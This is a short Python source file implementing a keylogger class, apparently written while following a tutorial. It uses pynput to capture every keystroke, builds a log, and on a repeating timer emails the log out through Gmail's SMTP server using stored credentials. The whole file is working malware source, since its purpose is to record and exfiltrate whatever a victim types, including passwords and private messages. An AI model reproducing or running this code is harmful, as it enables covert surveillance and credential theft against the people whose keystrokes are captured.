#!/usr/bin/env python
import pynput.keyboard
import threading
import smtplib


class KeyLog():
    def __init__(self, time_interval, email, password): #This code is executed automatically when the oject is created.
        self.log = "Keylogger Has started"
        self.time_interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char) #need to treat this object as a string.
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key) #Need to be aware of the indenting the code.

    def report(self):
        print(self.log)
        self.sending_email(self.email, self.password, "\n\n" + self.log)
        timer = threading.Timer(self.time_interval, self.report) #Setting a timer. #Allows you to continue a running a fucntion.
        timer.start()

    def sending_email(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)  # using the gmail server.
        server.starttls()  # Creates a TLS connection.
        server.login(email, password)  # Login into our gmail account.
        server.sendmail(email, email, message)  # Sending the email to ourselves
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press =self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

